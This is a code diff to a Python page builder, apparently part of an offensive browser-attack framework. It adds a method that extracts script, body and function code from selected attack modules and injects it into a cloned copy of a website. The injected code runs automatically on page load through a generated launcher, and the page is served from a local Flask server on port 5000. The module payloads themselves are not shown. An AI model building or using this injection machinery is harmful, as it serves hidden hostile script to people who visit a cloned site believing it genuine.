@@ -34,7 +34,7 @@ class Page_Builder:
 						if 'src="' in e and not e in self.src:
 							self.src.append(b)
 
-	def extract_body(self,name): # Extracting requiconfig.RED elements of the <body> tag from a module
+	def extract_body(self,name): # Extracting required elements of the <body> tag from a module
 		with open('core/templates/'+name,'r') as f:
 			p = iter(f.read().split('\n'))
 			for i in p:
@@ -57,6 +57,47 @@ class Page_Builder:
 					for i in a.strip().split(' '):
 						if '()' in i:
 							self.funcs.append(i.strip('{'))
+	
+	def inject_in_cloned_page(self):
+		temp = ''
+		for module in self.selected_modules:
+			basic.print_status('Extracting Code.'+config.YELLOW+f'[{module}]'+config.WHITE)
+			self.extract_code(module)
+			basic.print_status('Extracting <script src.'+config.YELLOW+f'[{module}]'+config.WHITE)
+			self.extract_src(module)
+			basic.print_status('Extracting body.'+config.YELLOW+f'[{module}]'+config.WHITE)
+			self.extract_body(module)
+			basic.print_status('Extracting Function Names.'+config.YELLOW+f'[{module}]'+config.WHITE)
+			self.extract_function_name(module)
+		basic.print_status('Starting merging process.')
+		with open('core/templates/final.html','wb') as f:
+			for i in self.src:
+				temp+=i+'\n'
+			for i in self.body:
+				temp+=i+'\n'
+			temp+='</body>\n'
+			temp+='<script>\n'
+			for i in self.code:
+				temp+=i+'\n'
+			a = ''
+			for i in self.funcs:
+				a+=i.strip()+'\nawait MLBsleep(2000);\n'
+			temp+='''function MLBsleep(ms) {
+					return new Promise(resolve => setTimeout(resolve, ms));
+					}
+async function mlb_launch() {
+await MLBsleep(2000);
+%s
+				}
+				'''%a.strip()
+			temp+='\nmlb_launch();'
+			temp+='\n</script>\n</html>'
+			basic.print_status('Merged templates.')
+			basic.print_status('Now merging with cloned site.')
+			with open('core/cloned.html','r',encoding='latin-1') as f2:
+				f.write(bytes(f2.read().replace('</html>', '').replace('</body>','')+'\n'+temp,'utf-8'))
+		basic.print_status('MERGED.')
+		server.server(5000,1)
 
 	def build_page(self): # Calling all the above functions and bulding the base HTML file.
 		'''
@@ -106,6 +147,5 @@ await MLBsleep(2000);
 			basic.print_status('MERGED.')
 		# Running the flask server
 			server.server(5000,1)
-			print('\n\n[*] SERVER STARTED\n')
 		else:
 			server.server(5000,0,self.selected_modules[0])
